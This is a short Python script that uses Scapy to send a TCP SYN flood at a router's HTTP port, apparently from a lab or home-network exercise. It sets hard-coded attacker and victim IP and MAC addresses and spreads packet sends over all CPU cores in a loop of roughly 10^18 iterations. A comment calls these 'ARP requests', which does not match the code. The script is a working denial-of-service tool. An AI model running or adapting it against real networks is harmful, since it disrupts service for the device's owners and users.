# WE KNOW THAT THE VICTIM, THAT IS THE ROUTER IS SERVING HTTP AT PORT 80
# WE WILL CREATE SYN PACKET USING SCAPY. WHEN SCAPY RECEIVES SYN+ACK PACKET FROM THE SERVER, IT AUTOMATICALLY CLOSES THE CONNECTION.
from scapy.all import *
import multiprocessing

ip_attacker = "192.168.1.6"
mac_attacker = "00:c0:ca:98:77:eb"
ip_victim = "192.168.1.1"
mac_victim = "7c:a9:6b:28:1b:80"

interface = "wlan0"

def tcpflood(ip_attacker,mac_attacker,ip_victim,mac_victim,interface):
    pkt = Ether()/IP()/TCP()
    pkt["Ethernet"].src = mac_attacker
    pkt["Ethernet"].dst = mac_victim
    pkt["IP"].src = ip_attacker
    pkt["IP"].dst = ip_victim
    pkt["TCP"].flags = "S"
    pkt["TCP"].seq = RandShort()
    pkt["TCP"].sport = RandShort()
    pkt["TCP"].dport = 80

    sendp(pkt,iface=interface)


# Utilize all available processors for parallel execution
num_cpus = multiprocessing.cpu_count()
pool_obj = multiprocessing.Pool(num_cpus)

# Submit 1000 individual ARP requests to the pool
for _ in range(1000000000000000000):
    pool_obj.apply_async(tcpflood,(ip_attacker,mac_attacker,ip_victim,mac_victim,interface))
# Close the pool and wait for all tasks to finish
pool_obj.close()
pool_obj.join()
# tcpflood(ip_attacker,mac_attacker,ip_victim,mac_victim,interface)
